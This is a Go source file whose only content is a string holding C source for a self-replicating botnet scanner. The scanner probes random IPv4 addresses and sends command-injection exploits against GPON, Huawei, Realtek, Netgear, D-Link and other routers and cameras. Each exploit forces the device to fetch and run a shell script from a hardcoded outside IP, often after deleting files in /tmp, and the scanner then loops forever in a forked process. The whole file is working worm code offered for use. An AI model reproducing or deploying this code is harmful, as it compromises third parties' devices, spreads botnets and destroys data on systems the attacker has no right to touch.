package payloads

var SelfRepScanner = `
// ==================== SELF-REPLICATING SCANNER MODULE ====================
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <time.h>

static int GPON1_Range[] = {187,189,200,201,207};
static int GPON2_Range[] = {1,2,5,31,37,41,42,58,62,78,82,84,88,89,91,92,95,103,113,118,145,147,178,183,185,195,210,212};

static int scanner_pid = 0;
static uint8_t ipState[40] = {0};
static const char *dropper_url = "http://178.62.253.101/bins/kaf.sh";

int selfrep_connect_tcp(char *host, int port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int sock;
    struct timeval timeout = {5, 0};
    
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) return 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        close(sock);
        return 0;
    }
    return sock;
}

void selfrep_gpon8080(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 8080);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
        "Host: 127.0.0.1:8080\r\n"
        "Content-Length: 118\r\n\r\n"
        "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;wget %s -O /tmp/kaf.sh;sh /tmp/kaf.sh&ipv=0", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_gpon80(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 80);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
        "Host: 127.0.0.1:80\r\n"
        "Content-Length: 118\r\n\r\n"
        "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;wget %s -O /tmp/kaf.sh;sh /tmp/kaf.sh&ipv=0", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_realtek(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 52869);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /picsdesc.xml HTTP/1.1\r\n"
        "Host: %s:52869\r\n"
        "Content-Length: 630\r\n\r\n"
        "<?xml version=\"1.0\"?>"
        "<s:Envelope>"
        "<s:Body>"
        "<u:AddPortMapping>"
        "<NewInternalClient>cd /tmp/; rm -rf*; wget %s -O /tmp/kaf.sh; chmod +x /tmp/kaf.sh; sh /tmp/kaf.sh</NewInternalClient>"
        "</u:AddPortMapping>"
        "</s:Body>"
        "</s:Envelope>", host, dropper_url);
    write(sock, request, strlen(request));
    sleep(5);
    close(sock);
}

void selfrep_netgear(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 80);
    if (sock > 0) {
        char request[1024];
        snprintf(request, sizeof(request),
            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*; wget %s -O /tmp/kaf.sh; chmod 755 /tmp/kaf.sh; sh /tmp/kaf.sh HTTP/1.0\r\n\r\n", dropper_url);
        write(sock, request, strlen(request));
        usleep(200000);
        close(sock);
    }
    sock = selfrep_connect_tcp((char *)host, 8080);
    if (sock > 0) {
        char request[1024];
        snprintf(request, sizeof(request),
            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*; wget %s -O /tmp/kaf.sh; chmod 755 /tmp/kaf.sh; sh /tmp/kaf.sh HTTP/1.0\r\n\r\n", dropper_url);
        write(sock, request, strlen(request));
        usleep(200000);
        close(sock);
    }
}

void selfrep_huawei(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 37215);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
        "Host: %s:37215\r\n"
        "Content-Length: 601\r\n\r\n"
        "<?xml version=\"1.0\"?>"
        "<s:Envelope>"
        "<s:Body>"
        "<u:Upgrade>"
        "<NewStatusURL>$(wget %s -O /tmp/kaf.sh; chmod 755 /tmp/kaf.sh; sh /tmp/kaf.sh)</NewStatusURL>"
        "</u:Upgrade>"
        "</s:Body>"
        "</s:Envelope>", host, dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_tr064(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 7574);
    if (sock > 0) {
        char request[1024];
        snprintf(request, sizeof(request),
            "POST /UD/act?1 HTTP/1.1\r\n"
            "Host: 127.0.0.1:7574\r\n"
            "Content-Length: 500\r\n\r\n"
            "<?xml version=\"1.0\"?>"
            "<SOAP-ENV:Envelope>"
            "<SOAP-ENV:Body>"
            "<u:SetNTPServers>"
            "<NewNTPServer1>cd /tmp && rm -rf * && wget %s -O /tmp/kaf.sh && chmod +x /tmp/kaf.sh && sh /tmp/kaf.sh</NewNTPServer1>"
            "</u:SetNTPServers>"
            "</SOAP-ENV:Body>"
            "</SOAP-ENV:Envelope>", dropper_url);
        write(sock, request, strlen(request));
        usleep(200000);
        close(sock);
    }
    sock = selfrep_connect_tcp((char *)host, 5555);
    if (sock > 0) {
        char request[1024];
        snprintf(request, sizeof(request),
            "POST /UD/act?1 HTTP/1.1\r\n"
            "Host: 127.0.0.1:5555\r\n"
            "Content-Length: 500\r\n\r\n"
            "<?xml version=\"1.0\"?>"
            "<SOAP-ENV:Envelope>"
            "<SOAP-ENV:Body>"
            "<u:SetNTPServers>"
            "<NewNTPServer1>cd /tmp && rm -rf * && wget %s -O /tmp/kaf.sh && chmod +x /tmp/kaf.sh && sh /tmp/kaf.sh</NewNTPServer1>"
            "</u:SetNTPServers>"
            "</SOAP-ENV:Body>"
            "</SOAP-ENV:Envelope>", dropper_url);
        write(sock, request, strlen(request));
        usleep(200000);
        close(sock);
    }
}

void selfrep_hnap(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 80);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /HNAP1/ HTTP/1.0\r\n"
        "Host: %s:80\r\n"
        "Content-Type: text/xml\r\n"
        "SOAPAction: http://purenetworks.com/HNAP1/cd /tmp && rm -rf * && wget %s -O /tmp/kaf.sh && chmod +x /tmp/kaf.sh && sh /tmp/kaf.sh\r\n"
        "Content-Length: 640\r\n\r\n"
        "<?xml version=\"1.0\"?>"
        "<soap:Envelope>"
        "<soap:Body>"
        "<AddPortMapping>"
        "<InternalClient>192.168.0.100</InternalClient>"
        "</AddPortMapping>"
        "</soap:Body>"
        "</soap:Envelope>", host, dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_crossweb(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 81);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "GET /language/Swedish&&cd /tmp;rm -rf *;wget %s -O /tmp/kaf.sh;chmod +x /tmp/kaf.sh;sh /tmp/kaf.sh HTTP/1.0\r\n\r\n", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_jaws(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 80);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "GET /shell?cd /tmp;rm -rf *;wget %s -O /tmp/kaf.sh;chmod 755 /tmp/kaf.sh;sh /tmp/kaf.sh HTTP/1.1\r\n"
        "Host: %s:80\r\n\r\n", dropper_url, host);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_dlink(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 49152);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "POST /soap.cgi?service=WANIPConn1 HTTP/1.1\r\n"
        "Host: %s:49152\r\n"
        "Content-Length: 630\r\n\r\n"
        "<?xml version=\"1.0\"?>"
        "<s:Envelope>"
        "<SOAP-ENV:Body>"
        "<m:AddPortMapping>"
        "<NewInternalClient>cd /tmp;rm -rf *;wget %s -O /tmp/kaf.sh;chmod +x /tmp/kaf.sh;sh /tmp/kaf.sh</NewInternalClient>"
        "</m:AddPortMapping>"
        "</SOAP-ENV:Body>"
        "</s:Envelope>", host, dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_r7000(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 8443);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "GET /cgi-bin/;cd /var/tmp;rm -rf *;wget %s -O /var/tmp/kaf.sh;chmod +x /var/tmp/kaf.sh;sh /var/tmp/kaf.sh", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_vacron(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 8080);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "GET /board.cgi?cmd=cd /tmp;rm -rf *;wget %s -O /tmp/kaf.sh;chmod 755 /tmp/kaf.sh;sh /tmp/kaf.sh", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_awsec2(unsigned char *host) {
    int sock = selfrep_connect_tcp((char *)host, 8080);
    if (sock <= 0) return;
    char request[1024];
    snprintf(request, sizeof(request),
        "GET /board.cgi?cmd=cd /tmp;rm -rf *;wget %s -O /tmp/kaf.sh;chmod 755 /tmp/kaf.sh;sh /tmp/kaf.sh", dropper_url);
    write(sock, request, strlen(request));
    usleep(200000);
    close(sock);
}

void selfrep_generate_gpon1() {
    srand(time(NULL));
    int idx = rand() % (sizeof(GPON1_Range)/sizeof(int));
    ipState[0] = GPON1_Range[idx];
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;
    char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    selfrep_gpon8080((unsigned char *)ip);
}

void selfrep_generate_gpon2() {
    srand(time(NULL));
    int idx = rand() % (sizeof(GPON2_Range)/sizeof(int));
    ipState[0] = GPON2_Range[idx];
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;
    char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    selfrep_gpon80((unsigned char *)ip);
}

void selfrep_generate_random() {
    srand(time(NULL));
    ipState[0] = rand() % 233;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;
    char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    int exploit_type = rand() % 13;
    switch(exploit_type) {
        case 0: selfrep_realtek((unsigned char *)ip); break;
        case 1: selfrep_netgear((unsigned char *)ip); break;
        case 2: selfrep_huawei((unsigned char *)ip); break;
        case 3: selfrep_tr064((unsigned char *)ip); break;
        case 4: selfrep_hnap((unsigned char *)ip); break;
        case 5: selfrep_crossweb((unsigned char *)ip); break;
        case 6: selfrep_jaws((unsigned char *)ip); break;
        case 7: selfrep_dlink((unsigned char *)ip); break;
        case 8: selfrep_r7000((unsigned char *)ip); break;
        case 9: selfrep_vacron((unsigned char *)ip); break;
        case 10: selfrep_awsec2((unsigned char *)ip); break;
        case 11: selfrep_gpon8080((unsigned char *)ip); break;
        case 12: selfrep_gpon80((unsigned char *)ip); break;
    }
}

void start_selfrep_scanner() {
    if(scanner_pid != 0) return;
    scanner_pid = fork();
    if(scanner_pid == 0) {
        while(1) {
            for(int i = 0; i < 10; i++) {
                selfrep_generate_gpon1();
                usleep(100000);
                selfrep_generate_gpon2();
                usleep(100000);
                selfrep_generate_random();
                usleep(100000);
            }
            sleep(12);
        }
    }
}

void stop_selfrep_scanner() {
    if(scanner_pid != 0) {
        kill(scanner_pid, 9);
        scanner_pid = 0;
    }
}
// ==================== END SELF-REP SCANNER MODULE ====================
`